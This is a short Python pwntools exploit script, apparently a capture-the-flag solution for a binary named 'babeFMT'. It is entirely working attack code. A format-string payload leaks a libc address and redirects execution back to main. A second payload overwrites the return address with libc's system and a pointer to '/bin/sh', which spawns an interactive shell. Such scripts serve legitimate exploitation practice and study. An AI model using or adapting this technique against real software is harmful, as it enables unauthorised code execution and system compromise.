from pwn import *
import time
elf = ELF("./babeFMT")
libc=elf.libc
context.binary=elf
target=process([elf.path])
context.log_level='DEBUG'

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

name="\x41\x20\x41\x00".ljust(0x16,"\x00")
sa("name?",name)
main=0x80490b0
payload=("%59$hhn"+"AAAA"+"%75$p").ljust(0xbc,"\x00")+p64(main)
payload=payload.ljust(0xdc,"\x00")+"\x50"
target.send(payload)
target.recvuntil("AAAA")
libc_base=int(target.recv(10)[2:10],16)-0x18e91
libc_system=libc_base+libc.sym["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
sa("name?",name)
payload="%59$hhn".ljust(0xbc,"\x00")
payload+=p32(libc_system)+p32(0xdeadbeef)+p32(libc_binsh)
payload=payload.ljust(0xdc,"\x00")+"\x50"
target.send(payload)
target.interactive()
